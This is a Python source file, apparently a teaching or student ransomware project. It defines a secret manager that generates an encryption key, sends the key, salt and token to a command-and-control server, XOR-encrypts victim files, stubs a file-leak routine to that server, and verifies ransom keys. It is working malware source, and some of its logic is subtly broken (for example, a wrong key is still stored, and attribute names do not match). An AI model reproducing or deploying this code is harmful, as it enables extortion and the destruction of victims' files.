from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        #Key is derived with the salt
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.KEY_LENGTH, salt=salt, iterations=self.ITERATION,)
        return kdf.derive(key)

    def create(self)->Tuple[bytes, bytes, bytes]:
        # Salt and key are randomly generated
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        #generate token with do_derivation fuction
        token=self.do_derivation(salt, key)

        return salt, key, token



    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        #Use the post function using the URL of the CNC and the json data
        response = requests.post('http://host/6666', json={
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        })
        
    def setup(self)->None:

        #Create the cryptographic data
        salt, key, token = self.create()

        #Local dir path to save the data
        dir_path = os.path.join(self._path, '/token')

        # Create the directory if needed
        if os.path.exists(dir_path) == False:
            os.makedirs(dir_path, exist_ok=True)
        
        # token.bin and salt.bin files paths
        token_file = os.path.join(dir_path, 'token.bin')
        salt_file = os.path.join(dir_path, 'salt.bin')
        
        # Check if token.bin exists
        if os.path.exists(token_file):
            print("token.bin file already exists")
            return
        else:
        
            # Save token and salt locally
            with open(token_file, 'wb') as f:
                f.write(token)
        
            with open(salt_file, 'wb') as f:
                f.write(salt)
    
            #Send the cryptographic data to the CNC
            self.post_new(salt, key, token)
        
    def load(self)->None:
        
        #Local dir path where data is stored
        dir_path = os.path.join(self._path, '/token')

                
        # token.bin and salt.bin files paths
        salt_file = os.path.join(dir_path, 'salt.bin')
        token_file = os.path.join(dir_path, 'token.bin')

        #Check that salt.bin exists
        if os.path.exists(salt_file):

            # Load salt from salt.bin
            with open(salt_file, "rb") as salt_f:
                self.salt = salt_f.read()
                
        #Check that token.bin exists  
        if os.path.exists(salt_file): 
        
            # Load token from token.bin
            with open(token_file, "rb") as token_f:
                self.token = token_f.read()
        

    def check_key(self, candidate_key:bytes)->bool:
        
        #Create a token with the salt and the candidate key
        candidate_token=self.do_derivation(self._salt, candidate_key)
        
        #Check if the candidate token and the real token are equal.
        #If yes, the key is the right one, otherwise it isn't the right key.
        if candidate_token==self._token:
            return True
        #No return False added after the if statement to generate an exception when the function is called in set_key() function and the key isn't correct


    def set_key(self, b64_key:str)->None:

        #Decode the key from base64 to binary
        decoded_key = base64.b64decode(b64_key)

        #use try and except to generate an exception if the key isn't correct
        try:
            #Call check_key() function to checkt that the key is correct
            self.check_key(decoded_key)

        #Manage the excepetion
        except:
            print("La clé est incorrecte.")

         #save the decoded key when it is correct
        self._key = decoded_key
        

    def get_hex_token(self)->str:
        token_hash=sha256(self._token.encode()).hexdigest()
        return token_hash
    
    def xorfiles(self, files:List[str])->None:
        #Go through each file in files and use xorfile function
        for f in files:
            xorfile(f,self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):

        #Local dir path where data is stored
        dir_path = os.path.join(self._path, '/token')

        # token.bin and salt.bin files paths
        salt_file = os.path.join(dir_path, "salt.bin")
        token_file = os.path.join(dir_path, "token.bin")

        #Delete salt.bin if it exists
        if os.path.exists(salt_file):
            os.remove(salt_file)
        
        #Delete token.bin if it exists
        if os.path.exists(token_file):
            os.remove(token_file)
        
        #Delete the /token directory if it exists
        if os.path.exists(dir_path):
            os.removedirs(dir_path)

        #Remove salt, token and key from memory
        self._salt = None
        self._token = None
        self._key = None